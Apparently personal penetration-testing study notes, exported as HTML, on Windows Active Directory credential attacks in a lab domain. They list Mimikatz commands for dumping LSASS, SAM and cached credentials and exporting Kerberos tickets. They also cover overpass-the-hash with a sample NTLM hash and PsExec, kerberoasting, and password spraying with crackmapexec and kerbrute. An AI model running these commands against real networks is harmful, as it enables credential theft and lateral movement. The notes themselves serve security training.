<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>02-authentication</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>02-authentication</h1><br/><p></p><p><em><h2>Cached creds</h2></em><ul><li> because of SSO , password hashes are stored in LSASS (local security authority subsystem service)</li><li>we need SYSTEM or local admin to get access top LSASS memory</li></ul></p><p></p><p><h2>Practical</h2><ul><li><ul><li></li></ul></li></ul><div class="codebox"><pre>token<span style="color:#ff9d00;font-weight:700">::</span>elevate<br />privilege<span style="color:#ff9d00;font-weight:700">::</span>debug<br />log<br />sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>logonpasswords<br />sekurlsa<span style="color:#ff9d00;font-weight:700">::</span>ekeys<br />lsadump<span style="color:#ff9d00;font-weight:700">::</span>sam<br />lsadump<span style="color:#ff9d00;font-weight:700">::</span>secrets<br />lsadump<span style="color:#ff9d00;font-weight:700">::</span>cache<br />lsadump<span style="color:#ff9d00;font-weight:700">::</span>lsa<br /><span style="color:#ff9d00;font-weight:700">::</span> <span style="color:#ff9d00;font-weight:700">//</span> checks all modules <br /><br />kerberos<span style="color:#ff9d00;font-weight:700">::</span>list <span style="color:#ff9d00;font-weight:700">/</span>export<br /></pre></div><ul><li>.\ &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; exit</li><li></li><li>privilege::debug</li><li>sekurlsa::logonpasswords<ul><li>dump hashes of local and remote sessions</li></ul></li><li>sekurlsa::tickets<ul><li>memory stored tickets</li></ul></li><li>.\ &quot;token::elevate&quot; &quot;kerberos::list /export&quot; exit <ul><li>export tickets</li></ul></li><li>purge<ul><li>kerberos::purge</li><li>kerberos::list</li></ul></li></ul></li><li>klist <ul><li>all cached creds/tickets for the current user7</li><li>e.g usage for kerberoasting</li></ul></p><p></p><p></p><p><em><h2>Mimikatz errors</h2></em></p><p><ul><li>   ERROR kuhl_m_sekurlsa_acquireLSA ; Key import<ul><li>https://gitlab.com/kalilinux/packages/mimikatz/-/blob/3100a45278237cb7f87ef28f7edbfef4135c615c/x64/</li></ul></li></ul></p><p><h2>Overpass the hash</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># obtain TGT from NTLM hash</span><br /><span style="color:#0088ff;font-weight:400"># mimikatz</span><br /> <span style="color:#0088ff;font-weight:400">##   sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:Powershell.exe</span><br />    sekurlsa::pth <span style="color:#ff9d00;font-weight:700">/</span>user:dave <span style="color:#ff9d00;font-weight:700">/</span>domain:corp.com <span style="color:#ff9d00;font-weight:700">/</span>ntlm:08d7a47a6f9f66b97b1bae4178747494 <span style="color:#ff9d00;font-weight:700">/</span>run:powershell<br />net use <span style="color:#333333;font-weight:400">\\</span>web04 <br />klist<br /><span style="color:#0088ff;font-weight:400"># we can obtain code execution via psexec (by reusing tft)</span><br /> .<span style="color:#333333;font-weight:400">\P</span>sExec.exe <span style="color:#333333;font-weight:400">\\</span>web04 cmd.exe</pre></div></p><p></p><p></p><p><h2>Pass the ticket</h2><ol><li>export TGS and reinject it somewhere else and then authenticate to a specific service</li><li>doesn&#39;t give other access but offer flexibility of which machine to use the ticket from</li><li>Silver ticket<ol><li>inject ticket with any admin groups<ol><li></li></ol></li></ol></li></ol><img src="images/331-1.png" alt="images/331-1.png" /></p><p></p><p></p><p></p><p><em><h2>crack  service tickets</h2></em></p><p>Add-Type -AssemblyName System.IdentityModel</p><p>New-Object</p><p>System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#39;HTTP/CorpWebServer.corp.com&#39;<ul><li>klist</li><li>kerberos::list /export</li><li>python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi</li></ul></p><p></p><p></p><p></p><p></p><p><em><h2>Password spraying</h2></em><ul><li>net accounts =&gt; lockout policy </li><li>Technique 1<ul><li>.\Spray-Passwords.ps1 -Pass &#39;1Gld_qmVoF1VP6&#39; -Admin</li></ul></li><li>Technique 2<ul><li>crackmapexec smb &lt;any domain connected machine&gt; -u users.txt -p password </li></ul></li><li>Technique 3<ul><li>kerbrute </li><li>.\kerbrute_windows_amd64.exe passwordspray .\users.txt &quot;Service1&quot; -d o.exam </li><li>.\kerbrute_windows_amd64.exe passwordspray .\users.txt &quot;  -d o.exam --user-as-pass</li></ul></li></ul></p><p></p><p></p><p></p><p><h2>Mimikatz windows 11</h2><ul><li>mimikatz3.exe // latest version</li></ul></p><p></p><p></p><p><h2>pass spraying creds</h2></p><p>sudo crackmapexec smb 10.200.141.0/24 -u &#39;watamet&#39; -p &#39;Nothingtoworry!&#39;</p></div>
</body>
</html>
